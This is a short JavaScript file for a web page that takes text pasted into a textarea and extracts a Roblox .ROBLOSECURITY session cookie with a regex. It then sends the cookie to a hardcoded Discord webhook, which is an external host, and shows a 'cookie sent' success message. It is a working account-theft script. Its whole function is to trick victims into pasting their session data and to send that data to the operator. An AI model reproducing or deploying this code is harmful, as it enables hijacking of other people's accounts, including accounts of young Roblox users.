function extractROBLOSECURITYFromPowerShell(input) {
    // Use a regex to locate .ROBLOSECURITY cookie
    const roblosecurityRegex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
    const match = input.match(roblosecurityRegex);

    if (match) {
        const roblosecurity = match[1];
        return roblosecurity;
    }

    return null; // Cookie not found
}

document.getElementById("submit").addEventListener("click", async () => {
    const rawData = document.getElementById("textarea").value;

    // Attempt to extract the .ROBLOSECURITY cookie
    const roblosecurity = extractROBLOSECURITYFromPowerShell(rawData);

    if (!roblosecurity) {
        Swal.fire({
            icon: "error",
            title: "Error",
            text: ".ROBLOSECURITY cookie not found. Please check your input.",
        });
        return;
    }

    // Send data to the webhook
    try {
        const webhookURL = "https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm";

        await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                embeds: [
                    {
                        title: "ROBLOSECURITY Found",
                        description: `Cookie: \`${roblosecurity}\``,
                        color: 16711680, // Red color
                    },
                ],
            }),
        });

        Swal.fire({
            icon: "success",
            title: "Success",
            text: ".ROBLOSECURITY cookie sent to the webhook!",
        });
    } catch (error) {
        console.error("Error sending data to webhook:", error);
        Swal.fire({
            icon: "error",
            title: "Error",
            text: "Failed to send data to webhook. Check console for details.",
        });
    }
});
